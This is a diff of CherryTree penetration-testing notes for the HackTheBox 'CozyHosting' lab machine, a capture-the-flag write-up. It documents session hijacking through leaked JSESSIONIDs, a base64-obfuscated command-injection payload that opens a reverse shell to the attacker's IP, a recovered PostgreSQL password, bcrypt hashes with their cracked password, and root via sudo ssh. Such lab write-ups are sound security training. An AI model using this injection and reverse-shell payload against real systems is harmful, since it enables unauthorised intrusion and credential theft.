@@ -46,15 +46,21 @@ Seems like it uses </rich_text>
       <rich_text> for the website.
 
 Ferox root:
-
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
 
 Dirsearch:
-
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
 
 On </rich_text>
       <rich_text link="webs http://cozyhosting.htb/actuator/sessions">http://cozyhosting.htb/actuator/sessions</rich_text>
       <rich_text>, we find:
-
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
 
 We also find: </rich_text>
       <rich_text weight="heavy">POST /executessh</rich_text>
@@ -103,7 +109,7 @@ We also find: </rich_text>
 {"B2E7D7C97B0681D362D4B4E1A2731970":"kanderson","265CCDC8B0BCC6235261261DDB3F63DC":"kanderson","7E5BF2FAD9E200CB7046A8EC981AF523":"UNAUTHORIZED"}
 # which are just JSESSIONID. we can change ours with kanderson's to attempt to get an admin session</codebox>
     </node>
-    <node name="Exploit" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694167289" ts_lastsave="1694175266">
+    <node name="Exploit" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694167289" ts_lastsave="1694281627">
       <rich_text>We may try to get code execution using the </rich_text>
       <rich_text weight="heavy">username</rich_text>
       <rich_text> parameter in </rich_text>
@@ -111,27 +117,54 @@ We also find: </rich_text>
       <rich_text> command.
 We can get a shell by using (URL encoded):
 </rich_text>
-      <codebox char_offset="128" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">;echo${IFS}""|base64${IFS}-d|bash;#</codebox>
+      <rich_text justification="left"></rich_text>
+      <codebox char_offset="128" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43MS80NDQ0IDA+JjE="|base64${IFS}-d|bash;#</codebox>
     </node>
-    <node name="Privilege Escalation" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694167307" ts_lastsave="1694178171">
+    <node name="Privilege Escalation" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694167307" ts_lastsave="1694282351">
       <rich_text>Initially, we are </rich_text>
       <rich_text weight="heavy">app</rich_text>
       <rich_text>.
 No SUDO capabilities.
 
 SUID
-
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
 
 /etc/passwd:
-
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
 
 netstat -tulpn
-
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
 
 We transfer </rich_text>
       <rich_text link="file Y2xvdWRob3N0aW5nLTAuMC4xLmphcg==">cloudhosting-0.0.1.jar</rich_text>
       <rich_text> on localhost, unarchive the jar, then we can find postgresql user and password:
 </rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+We can use to connect to PostgreSQL database:
+
+We find:
+
+Cracking will give us: </rich_text>
+      <rich_text weight="heavy">admin:manchesterunited</rich_text>
+      <rich_text>.
+
+We can login as </rich_text>
+      <rich_text weight="heavy">josh:manchesterunited</rich_text>
+      <rich_text> via SSH.
+
+SUDO capabilities:
+
+We gain root via: </rich_text>
+      <rich_text link="webs https://gtfobins.github.io/gtfobins/ssh/#sudo">https://gtfobins.github.io/gtfobins/ssh/#sudo</rich_text>
+      <rich_text>.</rich_text>
       <codebox char_offset="51" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">/usr/libexec/polkit-agent-helper-1
 /usr/lib/openssh/ssh-keysign
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -192,6 +225,11 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   </codebox>
       <codebox char_offset="203" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">postgres:Vg&amp;nvzAQ7XxR</codebox>
+      <codebox char_offset="252" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">psql "postgresql://postgres:Vg&amp;nvzAQ7XxR@127.0.0.1/cozyhosting"</codebox>
+      <codebox char_offset="263" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi</codebox>
+      <codebox char_offset="380" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *</codebox>
     </node>
   </node>
 </cherrytree>
